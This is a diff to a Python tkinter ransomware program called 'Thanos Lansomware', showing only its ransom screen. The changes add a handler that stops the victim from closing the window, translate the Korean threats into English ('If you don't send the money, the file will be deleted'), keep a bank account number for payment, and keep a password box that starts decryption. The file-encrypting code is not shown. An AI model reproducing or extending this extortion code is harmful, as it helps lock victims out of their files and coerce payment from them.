@@ -112,6 +112,12 @@ if __name__ == "__main__":
     width = window.winfo_width()
     window.configure(background="black")
 
+    def disable_event():
+        messagebox.showinfo(title="Thanos Lansomware", message="You can't leave this window.")
+        pass
+
+
+    window.protocol("WM_DELETE_WINDOW", disable_event)
     #버튼클릭시 복호화될수 있게
     def dec():
         pw=str(password.get())
@@ -122,19 +128,23 @@ if __name__ == "__main__":
         #window.destroy()
 
 
-    label1=tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.",fg="red",bg="black", font='Helvetica 14 bold')
+
+    label1=tkinter.Label(window, text="Thanos Lansomware is infected..",fg="green",bg="black", font='Helvetica 14 bold')
     label1.pack()
-    label2=tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red",bg="black", font='Helvetica 18 bold')
+
+    label2=tkinter.Label(window, text="If you don't send the money, the file will be deleted..", fg="green",bg="black", font='Helvetica 18 bold')
     label2.pack()
+
     label3=tkinter.Label(window, text="국민 786102-00-040854", fg="red",bg="black", font='Helvetica 18 bold')
     label3.pack()
 
-    label4=tkinter.Label(window, text="password:",fg="red",bg="black", font='Helvetica 14 bold')
+    label4=tkinter.Label(window, text="password:",fg="green",bg="black", font='Helvetica 14 bold')
     label4.pack()
+
     password= tkinter.Entry(window)
     password.pack()
 
-    pwbutton= tkinter.Button(window, text="복호화",command=dec)
+    pwbutton= tkinter.Button(window, text="enter",command=dec)
     pwbutton.pack()
 
     image = tkinter.PhotoImage(file="face.png")
